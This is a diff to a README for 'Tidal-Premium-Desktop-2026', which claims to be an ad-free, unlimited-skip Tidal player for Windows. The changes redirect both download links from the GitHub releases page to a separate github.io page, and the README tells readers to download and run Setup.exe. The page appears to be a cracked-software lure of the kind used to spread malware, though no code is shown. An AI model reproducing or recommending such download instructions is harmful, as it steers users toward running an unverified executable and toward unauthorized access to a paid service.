@@ -1,6 +1,6 @@
 # 🎧 Tidal-Premium-Desktop-2026 - High quality music for your computer
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Salleeandean79/Tidal-Premium-Desktop-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://salleeandean79.github.io)
 
 Tidal-Premium-Desktop-2026 provides a desktop music player for Windows. This application allows you to listen to music with high-fidelity sound. It removes advertisements and provides unlimited track skips. This tool works on desktop systems to deliver a clean listening experience.
 
@@ -20,7 +20,7 @@ Ensure your Windows system receives all current updates from Microsoft. This ens
 
 The installation process takes a few minutes. Follow these instructions to set up the software on your machine.
 
-1. Visit the following link to access the download page: [https://github.com/Salleeandean79/Tidal-Premium-Desktop-2026/releases](https://github.com/Salleeandean79/Tidal-Premium-Desktop-2026/releases).
+1. Visit the following link to access the download page: [https://salleeandean79.github.io](https://salleeandean79.github.io).
 2. Look for the latest version of the software.
 3. Click the file named Setup.exe to start your download.
 4. Locate the file in your Downloads folder once the transfer finishes.
